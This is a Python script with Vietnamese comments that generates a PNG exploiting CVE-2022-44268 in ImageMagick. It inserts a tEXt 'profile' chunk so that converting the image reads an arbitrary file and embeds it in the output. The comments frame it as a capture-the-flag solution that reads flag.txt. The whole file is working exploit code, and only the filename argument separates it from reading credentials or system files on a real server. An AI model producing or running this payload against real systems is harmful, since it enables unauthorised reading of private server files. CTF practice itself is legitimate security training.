import zlib
import struct

def create_chunk(chunk_type, chunk_data):
    """Hàm phụ trợ để tạo một chunk PNG hoàn chỉnh."""
    # Độ dài của dữ liệu
    len_data = len(chunk_data)
    
    # Gói độ dài thành 4 bytes, big-endian
    chunk_len = struct.pack('>I', len_data)
    
    # Kết hợp loại chunk và dữ liệu để tính CRC
    chunk_crc_data = chunk_type + chunk_data
    
    # Tính toán CRC32
    crc = zlib.crc32(chunk_crc_data)
    chunk_crc = struct.pack('>I', crc)
    
    # Trả về chunk hoàn chỉnh
    return chunk_len + chunk_crc_data + chunk_crc

# --- Tạo file PNG độc hại ---
def create_malicious_png(output_filename="payload.png", file_to_read="flag.txt"):
    """
    Tạo ra một file PNG 1x1 pixel hợp lệ chứa payload CVE-2022-44268.
    Payload yêu cầu ImageMagick đọc file `file_to_read` và nhúng vào metadata.
    """

    print(f"[*] Đang tạo file PNG độc hại '{output_filename}'...")
    print(f"[*] Payload sẽ yêu cầu đọc file: '{file_to_read}'")

    # 1. Signature của file PNG (8 bytes)
    png_signature = b'\x89PNG\r\n\x1a\n'

    # 2. IHDR chunk (Image Header)
    #    - Rộng: 1, Cao: 1
    #    - Bit depth: 8, Color type: 2 (Truecolor)
    #    - Các trường còn lại để mặc định là 0
    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    ihdr_chunk = create_chunk(b'IHDR', ihdr_data)

    # 3. tEXt chunk (PAYLOAD ĐỘC HẠI)
    #    - Keyword: profile
    #    - Null separator
    #    - Text: tên file cần đọc
    keyword = b'profile'
    text_data = file_to_read.encode('utf-8')
    text_chunk_data = keyword + b'\x00' + text_data
    text_chunk = create_chunk(b'tEXt', text_chunk_data)

    # 4. IDAT chunk (Image Data)
    #    - Dữ liệu cho ảnh 1x1 pixel màu đỏ (255, 0, 0)
    #    - Scanline filter byte (0) + R + G + B
    pixel_data = b'\x00\xff\x00\x00'
    compressed_pixel_data = zlib.compress(pixel_data, 9)
    idat_chunk = create_chunk(b'IDAT', compressed_pixel_data)
    
    # 5. IEND chunk (Image End)
    iend_chunk = create_chunk(b'IEND', b'')

    # 6. Ghi tất cả các chunk vào file
    with open(output_filename, 'wb') as f:
        f.write(png_signature)
        f.write(ihdr_chunk)
        f.write(text_chunk)  # Chèn chunk độc hại vào đây
        f.write(idat_chunk)
        f.write(iend_chunk)
        
    print(f"[+] Đã tạo thành công file '{output_filename}'!")

if __name__ == '__main__':
    # Trong bài CTF này, file flag.txt nằm ở cùng thư mục với `main.py`
    # và file `logo.png` (bị ghi đè) cũng ở đó.
    # Khi `convert` chạy, nó sẽ tìm `flag.txt` từ thư mục làm việc hiện tại của nó.
    create_malicious_png(output_filename="payload.png", file_to_read="flag.txt")